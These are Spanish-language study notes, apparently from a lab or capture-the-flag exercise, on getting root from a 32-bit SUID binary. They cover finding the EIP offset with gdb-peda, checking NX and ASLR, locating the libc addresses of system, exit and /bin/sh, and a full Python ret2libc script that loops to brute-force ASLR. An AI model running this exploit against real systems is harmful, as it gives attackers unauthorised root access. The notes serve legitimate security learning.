SE EXPLOTO VI (EDITOR DE TEXTO) CON AYUDA DE GTFOBINS 

PEDA PARA REALIZAR BUFFER OVERFLOW

APT INSTALL GBD

Hay programas que el desarrollador le asigna un limite de tamaño de buffer por ejemplo (30 bytes)
Si confia que el usuario va a meter el tamaño de buffer de menos de 30 bytes o caracteres
			ejecutamos con gdb /usr/bin/custom -q
			gbd-peda$  r A
			ingresamos luego:
				r AAAAAAAAAAA
		Ahora probaremos ingresando:
			r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
			como podemos observar se desbordo el buffer y aparece el siguiente comando
			
![[Pasted image 20250424120207.png]]

Nos enfocaremos en el EIP (Instruction pointer) esa direccion corresponde a la siguiente instruccion que tiene que ejecutar el programa
EIP hace que el flujo del programa funcione correctamente

Cuando introduces mayor tamaño de buffer a lo que esta configurado el sistema, se logra sobre-escribir ciertos registros del sistema
Ocacionando un riesgo total

Vemos que dice EIP: 0x41414141 ('AAAA') podemos probar metiendo otra cosa como 
gdb-peda$   r BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Podemos observar que cambia el EIP:
![[Pasted image 20250424120731.png]]
Si logramos controlar el flujo del programa para que apunte a una seccion y ejecute un comando que carguemos lo que se lograra es que el comando correra como root al ser binario suid

Como podemos  hacer que ponga la direccion que queramos:
Lo primero que debemos hacer es saber cuantas AAAA debemos de injectar hasta llegar a sobrescribir el registro EIP
Utilidad peda
			pattern create 300 (te genera 300 bytes) para que nos de una cadena y la injectemos
			
		
Asi:
		![[Pasted image 20250424121639.png]]
	Ahora vemos el EIP cambio a AA8A


Ahora filtremos AA8A en la cadena de 300 bytes que se genero
![[Pasted image 20250424122203.png]]
Tenemos que contar caracter por caracter hasta llegar AA8A

Para eso usamos 
gp-peda$ pattern offset $eip
			salida: found offset 112

Nos creamos una linea con python que nos genere 112 A
python3 -c 'print("A"*112)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

![[Pasted image 20250424122558.png]]
Ejecutamos y vemos que nos dio las 4 que extras que agregamos
![[Pasted image 20250424122629.png]]
Probamos con C y vemos que tambien se injecta eso significa que podemos controlar el EIP

Ahora debemos saber a donde apuntar
primero revisamos las protecciones que tiene el binario
![[Pasted image 20250424122840.png]]
Vemos que dice ENABLED (Esto impide apuntar a la pila o stack donde puedes intentar cargar caracteres para ejecutar caracteres)
NX -> NON EXECUTION

Veremos si ASLR esta habilitado (aleatorizacion de las secciones de la memoria)
ldd /usr/bin/custom
![[Pasted image 20250424125320.png]]
Como podemos observar en la imagen es que si hay aleatoriedad en la seccion de la memoria por lo que complica al atacante aplicar una llamada a nive de sistema que te ayuda a convertirte en root SOLO QUE AL SER DE 32 BIT Y SER TAN PEQUEÑA LA CADENA ES POSIBLE QUE SE REPITA VARIAS VECES:
![[Pasted image 20250424125604.png]]
Eso hace que si nos ejecutamos un programa multiples veces hacemos que se repita

instalamos `binutils`

Ejecutamos readelf empleando el siguiente comando para listar las direcciones y nos copiamos el output
![[Pasted image 20250424131054.png]]
Nos interesa la parte de system , exit y /bin/sh
Ya tenemos la direccion de exit y sistem ahora para conseguir la direccion de /bin/sh
Podemos jugar con strings --help
	strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
			 15bb2b /bin/sh

Crearemos un script en python:



 `#!/usr/bin/bash`

`import subprocess`
`from struct import pack`
`import sys`

`offset = 112`
`before_eip = b"A"*112`

``# `ret2libc -> system + exit + /bin/sh`

`base_libc_addr = 0xb7595000`

`#ken@2806-104e-0026-d6ca-020c-29ff-fed7-5765:/tmp$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E "system| exit"`
   `#141: 0002e9e0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0`
``# `1457: 0003adb0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0`

``# `15bb2b /bin/sh`
``# `"<L" Es little endian`
`exit_addr_off = 0x0002e9e0`
`system_addr_off = 0x0003adb0`
`bin_sh_addr_off = 0x0015bb2b`

`system_addr = pack("<L", base_libc_addr + system_addr_off)` 
`exit_addr = pack("<L", base_libc_addr  + exit_addr_off)` 
`bin_sh_addr = pack("<L", base_libc_addr  + bin_sh_addr_off)`



`payload = before_eip + system_addr + exit_addr + bin_sh_addr`

``# `El programa se ejecutara multiples veces debido a que libc vale muchas direcciones`

`while True:`

        `result = subprocess.run(["sudo", "/usr/bin/custom", payload])`
        `if result.returncode == 0:`
                `print("\n\n[+] Se ha salido correctamente del programa\n")`
                `sys.exit(0)`


